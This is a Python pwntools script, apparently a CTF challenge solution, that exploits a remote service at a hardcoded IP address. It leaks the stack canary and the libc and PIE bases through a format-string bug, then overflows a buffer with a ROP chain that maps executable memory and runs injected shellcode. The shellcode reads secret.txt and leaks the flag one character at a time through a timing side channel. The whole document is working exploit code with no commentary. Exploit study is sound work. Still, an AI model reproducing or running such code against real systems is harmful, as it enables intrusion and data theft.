from pwn import *
import string

context.log_level = 'error'
context.arch = 'amd64'

flagLen = 0x30
print("[+] Flag: HV23{", end="")
for location in range(5, flagLen):
    for ch in '_}' + string.ascii_lowercase + string.digits:
        rem = remote('152.96.15.10', 1337)
        rem.sendlineafter(b'? ', f'%43$p.%45$p.%47$p'.encode())
        leaks = rem.recvuntil(b'Name a ').lstrip(b'Processing the wishes of ').rstrip(b'\n\nName a ').split(b'.')

        libc = ELF('./libc_docker.so.6')
        prog = ELF('./pwn')

        libc_offset = libc.sym['__libc_start_main']
        main_offset = prog.sym['main']

        canary = int(leaks[0], 16)
        libc_base = int(leaks[1], 16) - libc_offset + 48
        pie_base = int(leaks[2], 16) - main_offset

        # print(f'Canary: {hex(canary)}')
        # print(f'libc_base: {hex(libc_base)}')
        # print(f'pie_base: {hex(pie_base)}')

        libc.address = libc_base
        prog.address = pie_base

        rop = ROP(libc)

        rop.raw(rop.find_gadget(['ret']))
        rop.raw(libc.address + 0x0000000000041979) # pop rcx ; add eax, 0x1a0751 ; ret
        rop.raw(32)
        rop.raw(libc.address + 0x000000000002a3e5) # pop rdi ; ret
        rop.raw(prog.sym['gifts'])
        rop.raw(libc.address + 0x0000000000054d69) # shl r9, cl ; mov qword ptr [rdi], r9 ; ret
        
        new_segment = prog.address + 0x6000
        rop.mmap(new_segment, 0x1000, 7, 0x2|0x20)
        rop.read(0, new_segment, 100)
        rop.call(new_segment)

        payload = b'A'*264
        payload += p64(canary)
        payload += rop.chain()

        rem.sendlineafter(b'wish: ', payload)

        for i in range(4):
            rem.sendlineafter(b'wish: ', b'a')

        file_name = next(prog.search(b'secret.txt'))
        data_segment = prog.address + 0x4000

        shellcode = asm(f'''
        mov rdi, {hex(file_name)}
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall

        mov rdi, rax
        mov rsi, {hex(data_segment)}
        mov rdx, 0x30
        xor rax, rax
        syscall

        mov rsi, {hex(data_segment)}
        add rsi, {hex(location)}
        xor rax, rax
        mov al, {hex(ord(ch))}
        mov bl, [rsi]
        cmp al, bl

        je L2
        jmp done
        L2:
        nop
        jmp L2
        done:
        nop
        ''')

        before = time.time()
        try:
            rem.sendline(shellcode)
            ret = rem.recvall(timeout=3)
            if time.time() - before >= 3:
                print(ch, end="")
                break
        except:
            if time.time() - before >= 3:
                print(ch, end="")
                break
